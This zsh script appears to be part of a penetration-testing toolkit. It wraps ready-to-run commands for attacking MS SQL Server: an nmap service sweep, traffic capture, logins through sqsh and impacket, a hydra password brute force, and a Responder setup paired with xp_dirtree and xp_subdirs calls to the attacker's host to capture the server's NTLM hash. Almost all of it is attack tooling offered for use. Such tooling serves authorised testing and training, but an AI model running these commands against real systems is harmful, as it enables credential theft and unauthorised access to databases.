#!/usr/bin/env zsh

############################################################# 
# nb-enum-mssql
#############################################################
nb-enum-mssql-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-mssql
-------------
The nb-enum-mssql namespace contains commands for scanning and enumerating MS SQL Server services and databases.

Connecting to Service
---------------------
nb-enum-mssql-connect             make an interactive database connection
nb-enum-mssql-connect-local       if we are targetting a local windows account
nb-enum-mssql-mssqlclient         use an impacket to connect
nb-enum-mssql-mssqlclient-local   use an impacket to connect to a local windows account

Other Commands
--------------
nb-enum-mssql-install             installs dependencies
nb-enum-mssql-nmap-sweep          scan a network for services
nb-enum-mssql-tcpdump             capture traffic to and from a host
nb-enum-mssql-hydra               brute force passwords for a user account
nb-enum-mssql-responder           capture mssql service hash

DOC
}

nb-enum-mssql-install() {
    __info "Running $0..."
    __pkgs tcpdump nmap sqsh impacket hydra
}

nb-enum-mssql-nmap-sweep() {
    __check-project
    nb-vars-set-network
    print -z "sudo grc nmap -n -Pn -sS -sC -sV -v -p 1433,1434 ${__NETWORK} -oA $(__netpath)/mssql-sweep"
}

nb-enum-mssql-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 1433 -w $(__hostpath)/mssql.pcap"
}

nb-enum-mssql-connect() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass
    print -z "sqsh -S ${__RHOST} -U ${__USER} -P ${__PASS} -h"
}

nb-enum-mssql-connect-local() {
    nb-vars-set-rhost
    nb-vars-set-user
    local db && __askvar db DATABASE
    print -z "sqsh -S ${__RHOST} -U .\\\\${__USER} -P '${__PASS}' -h"
}

nb-enum-mssql-mssqlclient() {
    nb-vars-set-rhost
    nb-vars-set-user
    local db && __askvar db DATABASE
    print -z "impacket-mssqlclient -p 1433 ${__USER}@${__RHOST}"
}

nb-enum-mssql-mssqlclient-local() {
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-domain
    print -z "impacket-mssqlclient -p 1433 ${__USER}@${__RHOST} -windows-auth"
}

nb-enum-mssql-hydra() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/mssql-hydra-brute-pass.txt ${__RHOST} mssql -F -t 64"
}

nb-enum-mssql-responder() {
    __check-project
    nb-vars-set-lhost
    print -z "responder -I tun0"

    echo
    __info "Run the following commands in mssql client:"
    __ok "  EXEC master..xp_dirtree '\\${__LHOST}\share\'"
    __ok "  EXEC master..xp_subdirs '\\${__LHOST}\share\'"
}
